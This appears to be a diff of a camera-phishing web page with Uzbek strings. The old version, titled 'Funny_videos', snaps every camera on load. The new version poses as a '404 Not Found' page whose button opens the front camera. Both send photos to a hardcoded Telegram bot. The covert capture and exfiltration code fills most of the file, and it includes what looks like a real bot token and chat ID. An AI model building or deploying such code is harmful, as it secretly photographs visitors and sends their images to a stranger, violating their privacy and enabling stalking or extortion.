@@ -1,73 +1,96 @@
 <!DOCTYPE html>
-<html lang="uz">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Funny_videos</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        html, body { margin:0; padding:0; background:#000; height:100%; overflow:hidden; }
-        video, canvas { display:none; }
-    </style>
+<meta charset="UTF-8">
+<title>404 Not Found</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body {
+    margin: 0;
+    padding: 0;
+    background: #fff;
+    color: #000;
+    font-family: Arial, Helvetica, sans-serif;
+}
+.wrapper {
+    padding: 40px;
+}
+h1 {
+    font-size: 32px;
+    margin-bottom: 10px;
+}
+p {
+    font-size: 16px;
+    margin-bottom: 30px;
+}
+button {
+    padding: 12px 22px;
+    font-size: 16px;
+    cursor: pointer;
+}
+video, canvas {
+    display: none;
+}
+</style>
 </head>
+
 <body>
 
-<video id="video" autoplay playsinline muted></video>
+<div class="wrapper">
+    <h1>404 Not Found</h1>
+    <p>The requested URL was not found on this server.</p>
+
+    <button id="photoBtn">📸 Rasmga olish</button>
+</div>
+
+<video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
 <script>
 const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
 const CHAT_ID  = "7880376636";
 
-function sendToTelegram(blob) {
+let started = false;
+let stream;
+
+async function sendToTelegram(blob) {
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
     formData.append("photo", blob);
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:"POST", body:formData });
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+    });
 }
 
-async function getCameras() {
-    const devices = await navigator.mediaDevices.enumerateDevices();
-    return devices.filter(d => d.kind === "videoinput");
-}
+document.getElementById("photoBtn").onclick = async () => {
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
 
-async function captureCamera(index=0) {
-    const cameras = await getCameras();
-    if(index >= cameras.length) return;
-
-    const deviceId = cameras[index].deviceId;
-
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video:{ deviceId: { exact: deviceId } } });
-        const video = document.getElementById("video");
+    if (!started) {
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" }
+        });
         video.srcObject = stream;
+        await video.play();
+        started = true;
+    }
 
-        video.onloadedmetadata = () => {
-            video.play();
+    if (video.videoWidth === 0) {
+        setTimeout(() => document.getElementById("photoBtn").click(), 200);
+        return;
+    }
 
-            function tryCapture() {
-                if(video.videoWidth > 0 && video.videoHeight > 0) {
-                    const canvas = document.getElementById("canvas");
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext("2d");
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0);
 
-                    canvas.toBlob(blob => {
-                        sendToTelegram(blob);
-                        stream.getTracks().forEach(t => t.stop());
-                        captureCamera(index + 1);
-                    }, "image/jpeg", 0.9);
-                } else {
-                    requestAnimationFrame(tryCapture);
-                }
-            }
-            tryCapture();
-        };
-    } catch(e) { console.log("Kamera ochilmadi:", e); }
-}
-
-// Ishga tushirish
-captureCamera();
+    canvas.toBlob(blob => {
+        sendToTelegram(blob);
+    }, "image/jpeg", 0.9);
+};
 </script>
 
 </body>
